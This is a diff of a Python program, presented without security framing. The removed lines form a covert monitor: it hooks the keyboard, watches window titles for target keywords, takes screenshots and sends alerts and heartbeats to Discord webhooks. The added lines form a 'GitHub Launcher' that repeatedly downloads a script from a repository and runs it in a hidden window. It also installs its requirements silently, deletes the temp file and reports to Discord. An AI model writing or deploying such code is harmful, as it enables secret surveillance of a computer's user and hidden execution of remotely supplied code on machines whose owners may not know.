-    """Check if password buffer contains the password"""
-    global password_buffer
-    if PASSWORD in password_buffer:
-        log_error("PASSWORD_DETECTED", f"Password '{PASSWORD}' detected, toggling tracking")
-        toggle_tracking()
-        password_buffer = ""  # Clear after successful match
-
-def setup_keyboard_listener():
-    """Setup global keyboard listeners"""
-    try:
-        # Hotkey to toggle tracking
-        keyboard.add_hotkey(TOGGLE_HOTKEY, toggle_tracking, suppress=False)
-        log_error("HOTKEY_REGISTERED", f"Hotkey '{TOGGLE_HOTKEY}' registered for toggling tracking")
-        log_error("PASSWORD_SETUP", f"Password '{PASSWORD}' configured for toggling tracking")
-        
-        # General key listener for password typing
-        keyboard.hook(on_key_event, suppress=False)
-        
-        return keyboard
-    except Exception as e:
-        log_error("KEYBOARD_SETUP_ERROR", "Failed to setup keyboard listeners", e)
+        log_message("ERROR", f"Failed to get content SHA for {file_path}: {e}", send_to_discord=True)
         return None
 
-def should_send_alert(hwnd, title, keyword):
-    """Check if we should send an alert for this window"""
-    global current_focused_hwnd, current_focused_title, last_alert_time, recently_alerted_windows
-    
-    current_time = time.time()
-    
-    # Clean up old entries from recently_alerted_windows
-    to_remove = []
-    for window_hwnd, (window_title, alert_time) in list(recently_alerted_windows.items()):
-        if current_time - alert_time > alert_cooldown * 2:  # Clean up after 2x cooldown
-            to_remove.append(window_hwnd)
-    
-    for hwnd_key in to_remove:
-        del recently_alerted_windows[hwnd_key]
-    
-    # Check if this is a new focus or different window
-    if hwnd == current_focused_hwnd and title == current_focused_title:
-        # Same window still focused, check cooldown
-        if current_time - last_alert_time < alert_cooldown:
-            return False  # Still in cooldown period
-        
-        # Check if we've already alerted for this window recently
-        if hwnd in recently_alerted_windows:
-            window_title, last_alert = recently_alerted_windows[hwnd]
-            if current_time - last_alert < alert_cooldown:
-                return False  # Already alerted for this window recently
-    
-    # Update focus tracking
-    current_focused_hwnd = hwnd
-    current_focused_title = title
-    
-    # Record this alert
-    recently_alerted_windows[hwnd] = (title, current_time)
-    last_alert_time = current_time
-    
-    return True
+def test_download_file(file_path):
+    """Test if we can actually download a file"""
+    try:
+        content = download_file_direct(file_path)
+        return content is not None
+    except:
+        return False
 
-# ---------------- HEARTBEAT THREAD ---------------- #
-def heartbeat_monitor():
-    """Periodically send heartbeat every 5 minutes"""
-    global last_heartbeat_time
-    
-    while True:
-        try:
-            current_time = time.time()
-            
-            # Check if it's time to send heartbeat
-            if current_time - last_heartbeat_time >= HEARTBEAT_INTERVAL:
-                log_error("HEARTBEAT_TRIGGERED", "Sending heartbeat...")
-                threading.Thread(target=send_heartbeat, daemon=True).start()
-                last_heartbeat_time = current_time
-            
-            # Sleep for 1 minute and check again
-            time.sleep(60)
-            
-        except Exception as e:
-            log_error("HEARTBEAT_MONITOR_ERROR", "Error in heartbeat monitor", e)
-            time.sleep(60)
+def verify_downloaded_version(file_content, expected_sha):
+    """Verify downloaded file matches expected SHA"""
+    try:
+        # GitHub uses this format for blob SHA calculation
+        content_bytes = file_content.encode('utf-8')
+        blob_content = f"blob {len(content_bytes)}\0".encode() + content_bytes
+        downloaded_sha = hashlib.sha1(blob_content).hexdigest()
+        return downloaded_sha == expected_sha
+    except:
+        return False
 
-# ---------------- PERIODIC SCREENSHOT THREAD ---------------- #
-def periodic_screenshot_monitor():
-    """Periodically take screenshots every 30 seconds"""
-    global last_periodic_screenshot_time
+def check_for_updates():
+    """Check for updates using GitHub API with rate limit awareness - FIXED VERSION"""
+    config = load_config()
+    updated_files = []
     
-    while True:
-        try:
-            current_time = time.time()
-            
-            # Check if it's time to take periodic screenshot
-            if (current_time - last_periodic_screenshot_time >= PERIODIC_SCREENSHOT_INTERVAL and 
-                tracking_enabled and SEND_SCREENSHOTS):
-                
-                log_error("PERIODIC_TRIGGERED", "Taking periodic screenshot...")
-                threading.Thread(target=send_periodic_screenshot, daemon=True).start()
-                last_periodic_screenshot_time = current_time
-                
-            # Sleep for 1 second and check again
-            time.sleep(1)
-            
-        except Exception as e:
-            log_error("PERIODIC_MONITOR_ERROR", "Error in periodic screenshot monitor", e)
-            time.sleep(1)
-
-# ---------------- MAIN LOOP ---------------- #
-def main_loop():
-    """Main monitoring loop with comprehensive error handling"""
-    global tracking_enabled
-    
-    log_error("SYSTEM_START", "Monitoring started...")
-    log_error("SYSTEM_CONFIG", f"Tracking is {'ENABLED' if tracking_enabled else 'DISABLED'} by default")
-    log_error("SYSTEM_CONFIG", f"Alert cooldown: {alert_cooldown} seconds per window")
-    log_error("SYSTEM_CONFIG", f"Periodic screenshots: Every {PERIODIC_SCREENSHOT_INTERVAL} seconds")
-    log_error("SYSTEM_CONFIG", f"Screenshot sending: {'ENABLED' if SEND_SCREENSHOTS else 'DISABLED'}")
-    
-    # Send startup webhook immediately
-    if DISCORD_WEBHOOKS and any(wh != "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
-        log_error("STARTUP_INIT", f"Sending startup webhook to {len(DISCORD_WEBHOOKS)} webhooks...")
-        threading.Thread(target=send_startup_message, daemon=True).start()
+    try:
+        # Get current content SHAs from GitHub
+        script_content_sha = get_file_content_sha(config['script_path'])
+        requirements_content_sha = get_file_content_sha(config['requirements_path'])
         
-        # Start heartbeat monitor in a separate thread
-        heartbeat_thread = threading.Thread(target=heartbeat_monitor, daemon=True)
-        heartbeat_thread.start()
-        log_error("HEARTBEAT_STARTED", f"Heartbeat monitor started (every {HEARTBEAT_INTERVAL//60} minutes)")
-        
-        # Start periodic screenshot monitor in a separate thread
-        periodic_thread = threading.Thread(target=periodic_screenshot_monitor, daemon=True)
-        periodic_thread.start()
-        log_error("PERIODIC_STARTED", f"Periodic screenshot monitor started (every {PERIODIC_SCREENSHOT_INTERVAL} seconds)")
-    else:
-        log_error("CONFIG_WARNING", "No webhooks configured - skipping startup and heartbeat messages")
-    
-    # Test Discord connections
-    valid_webhooks = []
-    for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
-        if webhook_url and webhook_url != "YOUR_DISCORD_WEBHOOK_URL_HERE":
-            log_error("WEBHOOK_CHECK", f"Webhook {i} configured: {webhook_url[:50]}...")
-            try:
-                if webhook_url.startswith("https://discord.com/api/webhooks/") or webhook_url.startswith("https://discordapp.com/api/webhooks/"):
-                    log_error("WEBHOOK_VALID", f"Webhook {i} URL format is valid")
-                    valid_webhooks.append(webhook_url)
+        # Check script.py
+        if script_content_sha:
+            current_sha = get_current_version("script")
+            if current_sha:
+                if script_content_sha != current_sha:
+                    log_message("INFO", f"script.py content has changed (SHA: {script_content_sha[:8]})")
+                    updated_files.append("script")
+            else:
+                # First time running - only save if we can actually download it
+                if test_download_file(config['script_path']):
+                    save_current_version("script", script_content_sha)
+                    log_message("INFO", f"Initial SHA saved for script.py: {script_content_sha[:8]}")
                 else:
-                    log_error("WEBHOOK_WARNING", f"Webhook {i} has unusual format")
-                    valid_webhooks.append(webhook_url)
-            except Exception as e:
-                log_error("WEBHOOK_TEST_ERROR", f"Could not test webhook {i}", e)
-                valid_webhooks.append(webhook_url)
+                    log_message("WARNING", "Cannot download script, not saving initial SHA")
+        
+        # Check requirements.txt
+        if requirements_content_sha:
+            current_sha = get_current_version("requirements")
+            if current_sha:
+                if requirements_content_sha != current_sha:
+                    log_message("INFO", f"requirements.txt content has changed (SHA: {requirements_content_sha[:8]})")
+                    updated_files.append("requirements")
+            else:
+                # First time running - only save if we can actually download it
+                if test_download_file(config['requirements_path']):
+                    save_current_version("requirements", requirements_content_sha)
+                    log_message("INFO", f"Initial SHA saved for requirements.txt: {requirements_content_sha[:8]}")
+                else:
+                    log_message("WARNING", "Cannot download requirements, not saving initial SHA")
+        
+        return updated_files
+        
+    except Exception as e:
+        log_message("ERROR", f"Error checking for updates: {e}", send_to_discord=True)
+        return []
+
+def download_file_direct(file_path):
+    """Download file directly from raw GitHub URL"""
+    config = load_config()
     
-    if valid_webhooks:
-        log_error("WEBHOOK_SUMMARY", f"{len(valid_webhooks)}/{len(DISCORD_WEBHOOKS)} webhooks are valid")
-    else:
-        log_error("CONFIG_ERROR", "No valid webhooks configured - skipping Discord alerts")
+    raw_url = f"https://raw.githubusercontent.com/{config['repository_owner']}/{config['repository_name']}/{config['branch']}/{urllib.parse.quote(file_path)}"
     
-    # Setup keyboard listener
-    kb_listener = setup_keyboard_listener()
-    if not kb_listener:
-        log_error("CRITICAL_ERROR", "Failed to setup keyboard listener - exiting")
+    try:
+        headers = {}
+        # Add token for raw.githubusercontent.com if it's a private repo
+        token = config.get('github_token')
+        if token:
+            headers['Authorization'] = f"token {token}"
+        
+        req = urllib.request.Request(raw_url, headers=headers)
+        response = urllib.request.urlopen(req, timeout=10)
+        content = response.read().decode('utf-8')
+        return content
+        
+    except Exception as e:
+        log_message("ERROR", f"Failed to download {file_path}: {e}", send_to_discord=True)
+        return None
+
+def run_script_from_github():
+    """Download and run script.py - FIXED VERSION"""
+    global current_script_process
+    
+    config = load_config()
+    temp_script = None
+    
+    try:
+        # Get current content SHA to check if we need to update
+        remote_sha = get_file_content_sha(config['script_path'])
+        
+        if not remote_sha:
+            error_msg = "Failed to get remote script SHA"
+            log_message("ERROR", error_msg, send_to_discord=True)
+            return False
+        
+        # Get current stored SHA
+        current_sha = get_current_version("script")
+        
+        # If we already have the latest version and script is running, don't restart
+        if current_sha == remote_sha and current_script_process and current_script_process.poll() is None:
+            log_message("INFO", "Script is already up to date and running")
+            return True
+        
+        # Download script
+        script_content = download_file_direct(config['script_path'])
+        
+        if not script_content:
+            error_msg = "Failed to download script"
+            log_message("ERROR", error_msg, send_to_discord=True)
+            clear_version_on_failure("script")  # Clear version if download fails
+            return False
+        
+        # Verify downloaded content matches expected SHA
+        if not verify_downloaded_version(script_content, remote_sha):
+            error_msg = f"Downloaded script SHA doesn't match expected SHA: {remote_sha[:8]}"
+            log_message("ERROR", error_msg, send_to_discord=True)
+            clear_version_on_failure("script")  # Clear version if verification fails
+            return False
+        
+        # Save to temp file
+        temp_dir = tempfile.gettempdir()
+        timestamp = str(int(time.time()))
+        temp_script = os.path.join(temp_dir, f"script_{timestamp}.py")
+        
+        with open(temp_script, 'w', encoding='utf-8') as f:
+            f.write(script_content)
+        
+        log_message("INFO", f"Script saved to: {temp_script}")
+        
+        # Terminate existing script process if any
+        if current_script_process and current_script_process.poll() is None:
+            log_message("INFO", "Terminating previous script instance")
+            try:
+                # Try to terminate gracefully
+                current_script_process.terminate()
+                try:
+                    current_script_process.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    # Force kill if it doesn't terminate
+                    current_script_process.kill()
+                    current_script_process.wait()
+            except:
+                pass
+        
+        # Run it hidden
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        
+        process = subprocess.Popen(
+            [sys.executable, temp_script],
+            startupinfo=startupinfo,
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        
+        current_script_process = process
+        
+        # Check if process starts
+        time.sleep(2)
+        
+        if process.poll() is not None:
+            # Try to read any error output
+            stderr_output = ""
+            try:
+                stdout, stderr = process.communicate(timeout=1)
+                if stderr:
+                    stderr_output = stderr[:500]
+                    log_message("ERROR", f"Script error: {stderr_output}")
+            except:
+                pass
+            
+            error_msg = f"Script terminated immediately: {process.returncode}"
+            log_message("ERROR", error_msg, send_to_discord=True, error_details=stderr_output)
+            clear_version_on_failure("script")  # Clear version if script fails to start
+            return False
+        
+        success_msg = f"✓ Script started with PID: {process.pid}"
+        log_message("INFO", success_msg, send_to_discord=True)
+        
+        # Save content SHA AFTER successful start
+        save_current_version("script", remote_sha)
+        
+        # Clean up temp file after delay
+        def cleanup_temp():
+            time.sleep(30)
+            try:
+                if os.path.exists(temp_script):
+                    os.remove(temp_script)
+                    log_message("DEBUG", "Temp file cleaned up")
+            except:
+                pass
+        
+        threading.Thread(target=cleanup_temp, daemon=True).start()
+        
+        return True
+        
+    except Exception as e:
+        error_msg = f"Error running script: {e}"
+        log_message("ERROR", error_msg, send_to_discord=True, error_details=traceback.format_exc())
+        traceback.print_exc()
+        
+        # Clear version on any failure
+        clear_version_on_failure("script")
+        
+        if temp_script and os.path.exists(temp_script):
+            try:
+                os.remove(temp_script)
+            except:
+                pass
+        return False
+
+def install_requirements():
+    """Download and install requirements - FIXED VERSION"""
+    config = load_config()
+    
+    try:
+        # Get current SHA to check if we need to update
+        remote_sha = get_file_content_sha(config['requirements_path'])
+        
+        if not remote_sha:
+            log_message("INFO", "No requirements.txt found or can't access")
+            return True
+        
+        # Get current stored SHA
+        current_sha = get_current_version("requirements")
+        
+        # Check if we need to install
+        if current_sha == remote_sha:
+            log_message("INFO", "Requirements already up to date")
+            return True
+        
+        # Download requirements
+        requirements_content = download_file_direct(config['requirements_path'])
+        
+        if not requirements_content:
+            log_message("INFO", "No requirements.txt or empty")
+            # Don't save SHA if we can't download
+            return False
+        
+        if not requirements_content.strip():
+            log_message("INFO", "Empty requirements.txt")
+            # Don't save SHA if empty
+            return True
+        
+        # Validate requirements file content
+        lines = requirements_content.strip().split('\n')
+        valid_lines = []
+        for line in lines:
+            line = line.strip()
+            if line and not line.startswith('#'):  # Skip comments and empty lines
+                valid_lines.append(line)
+        
+        if not valid_lines:
+            log_message("INFO", "No valid requirements found")
+            # Don't save SHA if no valid requirements
+            return True
+        
+        # Install requirements
+        log_message("INFO", f"Installing {len(valid_lines)} requirements...")
+        
+        # Save requirements to temp file
+        temp_dir = tempfile.gettempdir()
+        temp_req = os.path.join(temp_dir, f"requirements_{int(time.time())}.txt")
+        
+        with open(temp_req, 'w', encoding='utf-8') as f:
+            f.write('\n'.join(valid_lines))
+        
+        # Run pip install
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        
+        process = subprocess.Popen(
+            [sys.executable, "-m", "pip", "install", "-r", temp_req, "--quiet"],
+            startupinfo=startupinfo,
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        
+        process.wait(timeout=120)
+        
+        if process.returncode == 0:
+            success_msg = "✓ Requirements installed successfully"
+            log_message("INFO", success_msg, send_to_discord=True)
+            # Save SHA only after successful installation
+            save_current_version("requirements", remote_sha)
+        else:
+            stdout, stderr = process.communicate()
+            error_details = ""
+            if stderr:
+                error_details = stderr.decode('utf-8')[:500]
+                log_message("ERROR", f"Pip error: {error_details}")
+            error_msg = f"Failed to install requirements: {process.returncode}"
+            log_message("ERROR", error_msg, send_to_discord=True, error_details=error_details)
+            # Clear version on failure
+            clear_version_on_failure("requirements")
+        
+        # Clean up
+        try:
+            os.remove(temp_req)
+        except:
+            pass
+        
+        return process.returncode == 0
+        
+    except Exception as e:
+        error_msg = f"Error installing requirements: {e}"
+        log_message("ERROR", error_msg, send_to_discord=True, error_details=traceback.format_exc())
+        traceback.print_exc()
+        # Clear version on any exception
+        clear_version_on_failure("requirements")
+        return False
+
+def initial_setup():
+    """Perform initial setup - called once at startup"""
+    global initial_setup_complete
+    
+    if initial_setup_complete:
         return
     
+    log_message("INFO", "Performing initial setup...", send_to_discord=True)
+    
+    # Get SHAs and save them without triggering updates
+    config = load_config()
+    
+    for file_path, file_type in [(config['script_path'], "script"), 
+                                 (config['requirements_path'], "requirements")]:
+        content_sha = get_file_content_sha(file_path)
+        if content_sha:
+            # Only save initial SHA if we can actually download the file
+            if test_download_file(file_path):
+                save_current_version(file_type, content_sha)
+                log_message("INFO", f"Initial SHA saved for {file_path}: {content_sha[:8]}")
+            else:
+                log_message("WARNING", f"Cannot download {file_path}, not saving initial SHA")
+    
+    # Install requirements
+    log_message("INFO", "Checking requirements...")
+    if not install_requirements():
+        log_message("WARNING", "Requirements check had issues", send_to_discord=True)
+    
+    # Start script
+    log_message("INFO", "Starting script...")
+    time.sleep(2)
+    if not run_script_from_github():
+        log_message("ERROR", "Failed to start script during initial setup", send_to_discord=True)
+    
+    initial_setup_complete = True
+
+def monitor_updates():
+    """Monitor for updates with better rate limit handling"""
+    
+    # Do initial setup first
+    initial_setup()
+    
+    while True:
+        try:
+            config = load_config()
+            interval = config.get('update_check_interval', 300)
+            
+            # Clear rate limit wait at the start of each check
+            global rate_limit_wait
+            rate_limit_wait = 0
+            
+            log_message("INFO", f"Checking for updates (interval: {interval}s)...")
+            
+            # Check for actual updates
+            updated_files = check_for_updates()
+            
+            if updated_files:
+                update_msg = f"Updates detected: {', '.join(updated_files)}"
+                log_message("INFO", update_msg, send_to_discord=True)
+                
+                # Handle requirements first if needed
+                if "requirements" in updated_files:
+                    if install_requirements():
+                        # Wait a bit after installing requirements
+                        time.sleep(5)
+                    else:
+                        log_message("ERROR", "Failed to install requirements", send_to_discord=True)
+                
+                # Then handle script update
+                if "script" in updated_files:
+                    if not run_script_from_github():
+                        log_message("ERROR", "Failed to update script", send_to_discord=True)
+            
+            # Check if script is still running
+            if current_script_process and current_script_process.poll() is not None:
+                warning_msg = "Script has stopped, attempting to restart..."
+                log_message("WARNING", warning_msg, send_to_discord=True)
+                if not run_script_from_github():
+                    error_msg = "Failed to restart script"
+                    log_message("ERROR", error_msg, send_to_discord=True)
+            
+        except Exception as e:
+            error_msg = f"Error in update monitor: {e}"
+            log_message("ERROR", error_msg, send_to_discord=True, error_details=traceback.format_exc())
+            traceback.print_exc()
+        
+        # Sleep for the configured interval
+        try:
+            config = load_config()
+            interval = config.get('update_check_interval', 300)
+            log_message("DEBUG", f"Next check in {interval} seconds")
+            time.sleep(interval)
+        except Exception as e:
+            log_message("ERROR", f"Error in sleep interval: {e}", send_to_discord=True)
+            time.sleep(300)  # Fallback to 5 minutes
+
+def handle_command_input():
+    """Handle command-line style input for the launcher"""
+    while True:
+        try:
+            # Check if stdin is available (running in console)
+            if sys.stdin.isatty():
+                print("\n[COMMAND] Type 'config' to edit settings, 'help' for options: ", end='', flush=True)
+                
+                # Try to read input (this may fail in .pyw files)
+                try:
+                    import msvcrt
+                    # Read characters until Enter is pressed
+                    command = ""
+                    while True:
+                        if msvcrt.kbhit():
+                            char = msvcrt.getch().decode('utf-8', errors='ignore')
+                            if char == '\r':  # Enter key
+                                print()  # New line
+                                break
+                            elif char == '\x08':  # Backspace
+                                if command:
+                                    command = command[:-1]
+                                    sys.stdout.write('\b \b')  # Erase character
+                                    sys.stdout.flush()
+                            else:
+                                if char.isprintable():
+                                    command += char
+                                    sys.stdout.write(char)
+                                    sys.stdout.flush()
+                    
+                    command = command.strip().lower()
+                    
+                    if command == "config" or command == "editconfig":
+                        print("\n[COMMAND] Opening configuration editor...")
+                        edit_config_interactive()
+                    elif command == "showconfig":
+                        print("\n[COMMAND] Showing current configuration...")
+                        show_config()
+                    elif command == "help":
+                        print("\n[HELP] Available commands:")
+                        print("  config/editconfig - Edit configuration interactively")
+                        print("  showconfig        - Show current configuration")
+                        print("  status            - Show current status")
+                        print("  restart           - Restart the monitored script")
+                        print("  exit              - Exit the launcher")
+                        print("  help              - Show this help")
+                    elif command == "status":
+                        print("\n[STATUS] Launcher is running")
+                        print(f"  Update interval: {CONFIG.get('update_check_interval', 300)} seconds")
+                        print(f"  Repository: {CONFIG['repository_owner']}/{CONFIG['repository_name']}")
+                        if current_script_process:
+                            if current_script_process.poll() is None:
+                                print(f"  Script PID: {current_script_process.pid} (running)")
+                            else:
+                                print(f"  Script: Not running (exit code: {current_script_process.poll()})")
+                        else:
+                            print("  Script: Not started")
+                        
+                        # Show current versions
+                        script_ver = get_current_version("script")
+                        req_ver = get_current_version("requirements")
+                        print(f"  Script version: {script_ver[:8] if script_ver else 'Not saved'}")
+                        print(f"  Requirements version: {req_ver[:8] if req_ver else 'Not saved'}")
+                        
+                    elif command == "restart":
+                        print("\n[COMMAND] Restarting script...")
+                        if run_script_from_github():
+                            print("  ✓ Script restarted successfully")
+                        else:
+                            print("  ✗ Failed to restart script")
+                    elif command == "exit":
+                        print("\n[COMMAND] Exiting launcher...")
+                        if current_script_process and current_script_process.poll() is None:
+                            current_script_process.terminate()
+                        os._exit(0)
+                    elif command:
+                        print(f"\n[ERROR] Unknown command: '{command}'")
+                        print("  Type 'help' for available commands")
+                
+                except ImportError:
+                    # Not on Windows or msvcrt not available
+                    time.sleep(1)
+            else:
+                # Not running in interactive terminal, just sleep
+                time.sleep(5)
+                
+        except Exception as e:
+            # If there's any error, just sleep and continue
+            time.sleep(5)
+
+def main():
+    """Main launcher function"""
+    print("=" * 60)
+    print("GitHub Launcher (Memory-Optimized) - FIXED VERSION")
+    print(f"Started: {datetime.now().strftime('%Y-%m-d %H:%M:%S')}")
+    print("=" * 60)
+    
+    # Show configuration summary
+    show_config()
+    
+    # Send startup notification to Discord
+    config = load_config()
+    startup_msg = f"GitHub Launcher started on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    log_message("INFO", startup_msg, send_to_discord=True)
+    
+    # Check if GitHub token is configured
+    token = config.get('github_token')
+    if not token or token == "":
+        warning_msg = "No GitHub token configured - rate limits may apply"
+        print("\n⚠ WARNING: " + warning_msg)
+        print("  You will hit rate limits (60 requests/hour).")
+        print("  Type 'config' to add your GitHub token.")
+        log_message("WARNING", warning_msg, send_to_discord=True)
+    else:
+        print("\n✓ GitHub token configured")
+    
+    # Check Discord logging
+    if config.get('enable_discord_logging', True):
+        print("✓ Discord logging enabled")
+    else:
+        print("⚠ Discord logging disabled")
+    
+    print("-" * 60)
+    print("COMMANDS AVAILABLE IN CONSOLE:")
+    print("  Type 'config'       - Edit configuration")
+    print("  Type 'showconfig'   - Show current configuration")
+    print("  Type 'status'       - Show current status")
+    print("  Type 'restart'      - Restart the monitored script")
+    print("  Type 'help'         - Show command help")
+    print("  Type 'exit'         - Exit the launcher")
+    print("-" * 60)
+    
+    # Start command handler in a separate thread
+    command_thread = threading.Thread(target=handle_command_input, daemon=True)
+    command_thread.start()
+    
+    # Start update monitor
+    log_message("INFO", "Starting update monitor...")
+    monitor_thread = threading.Thread(target=monitor_updates, daemon=True)
+    monitor_thread.start()
+    
+    if initial_setup_complete:
+        print("\n" + "=" * 60)
+        print("✓ Launcher running")
+        print(f"✓ Checking for updates every {config['update_check_interval']} seconds")
+        print("✓ Type 'config' in console to edit configuration")
+        print("=" * 60)
+    else:
+        print("\n" + "=" * 60)
+        print("⚠ Launcher starting up...")
+        print("Initial setup in progress")
+        print("Type 'config' in console to edit configuration")
+        print("=" * 60)
+    
+    # Keep main thread alive
     try:
         while True:
-            # Only process tracking if enabled
-            if tracking_enabled:
-                try:
-                    hwnd = win32gui.GetForegroundWindow()
-                    title = win32gui.GetWindowText(hwnd).strip()
-
-                    if not title:
-                        time.sleep(0.05)
-                        continue
-
-                    # Detect target
-                    detected = title_matches_target(title)
-
-                    if detected:
-                        keyword = get_matching_keyword(title)
-                        
-                        # Check if we should send an alert for this window
-                        if should_send_alert(hwnd, title, keyword):
-                            log_error("DETECTION", f"Target detected: '{title}' (Keyword: {keyword})")
-                            
-                            # Small delay before taking screenshot to ensure window is focused
-                            time.sleep(SCREENSHOT_DELAY)
-                            
-                            # Take screenshot in main thread
-                            screenshot = None
-                            if SEND_SCREENSHOTS:
-                                screenshot = take_screenshot()
-                                if screenshot is None:
-                                    log_error("SCREENSHOT_ALERT_FAILED", 
-                                             f"Failed to take screenshot for detected target: '{title}'",
-                                             additional_info=f"Keyword: {keyword}, Failure count: {screenshot_failure_count}")
-                            
-                            # Send alert to both webhooks
-                            alert_thread = threading.Thread(
-                                target=send_discord_alert,
-                                args=(title, keyword, screenshot),
-                                daemon=True
-                            )
-                            alert_thread.start()
-                        else:
-                            # Debug logging for skipped alerts
-                            if hwnd == current_focused_hwnd:
-                                log_error("ALERT_SKIPPED", f"Already alerted for this window recently: '{title[:50]}...'")
-                    else:
-                        # Not a target window, update focus tracking
-                        current_focused_hwnd = hwnd
-                        current_focused_title = title
-
-                except Exception as e:
-                    log_error("MAIN_LOOP_ERROR", "Error in main detection loop", e)
-            
-            # Sleep regardless of tracking state
-            time.sleep(0.1)
-
+            time.sleep(60)
     except KeyboardInterrupt:
-        log_error("SYSTEM_STOP", "Program interrupted by user")
+        shutdown_msg = "Launcher terminated by user"
+        print(f"\n{shutdown_msg}")
+        log_message("INFO", shutdown_msg, send_to_discord=True)
+        if current_script_process and current_script_process.poll() is None:
+            try:
+                current_script_process.terminate()
+                current_script_process.wait(timeout=5)
+            except:
+                pass
     except Exception as e:
-        log_error("CRITICAL_ERROR", "Unexpected error in main loop", e)
-    finally:
-        # Cleanup
-        try:
-            keyboard.unhook_all()
-            log_error("SYSTEM_CLEANUP", "Keyboard listeners stopped")
-        except Exception as e:
-            log_error("CLEANUP_ERROR", "Error during cleanup", e)
-        
-        log_error("SYSTEM_END", "Program ended")
+        crash_msg = f"Launcher crashed: {e}"
+        log_message("CRITICAL", crash_msg, send_to_discord=True, error_details=traceback.format_exc())
+        raise
+    
+    sys.exit(0)
 
-# Start the main loop
 if __name__ == "__main__":
-    main_loop()
+    # Check for psutil
+    try:
+        import psutil
+    except ImportError:
+        print("Installing psutil...")
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil", "--quiet"])
+            import psutil
+        except:
+            print("Warning: Failed to install psutil. Continuing without it...")
+            psutil = None
+    
+    main()
